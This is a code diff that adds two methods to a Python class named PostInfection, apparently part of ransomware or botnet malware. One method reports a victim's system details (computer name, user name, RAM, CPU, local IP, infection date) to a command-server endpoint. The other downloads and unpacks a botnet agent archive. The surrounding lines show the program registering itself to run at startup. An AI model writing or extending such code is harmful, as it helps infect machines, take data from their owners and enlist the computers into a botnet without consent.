@@ -78,3 +78,43 @@ class PostInfection(object):
         # self.changeWallpaper()
         self.setItselfStartUpApplication()
         print(self.getSystemInfo())
+
+
+    def firstTouch(self,encryptedInformations):
+        """
+        POST /api/user/firsttouch
+        system information encrypted with RSA public key of victim
+            - id
+            - computer name
+            - user name
+            - infection date
+            - ram
+            - cpu
+            - local ip
+            - 
+        """
+        from requests import post
+
+        url = 'middleware/api/user/firsttouch'
+        data = {'info': encryptedInformations}
+
+        response = post(url, data = data)
+
+        print(response.text)
+
+    def botnetAgentDownload(self):
+        """
+            GET /botnet/agent
+        """
+        from zipfile import ZipFile
+        from shutil import copyfileobj
+        from urllib.request import urlopen
+
+        url = "middleware/botnet/agent/botnet.zip"
+        file_name = 'botnet.zip'
+
+        with urlopen(url) as response, open(file_name, 'wb') as out_file:
+            copyfileobj(response, out_file)
+            with ZipFile(file_name) as zf:
+                zf.extractall()
+        # RUN botnot agent
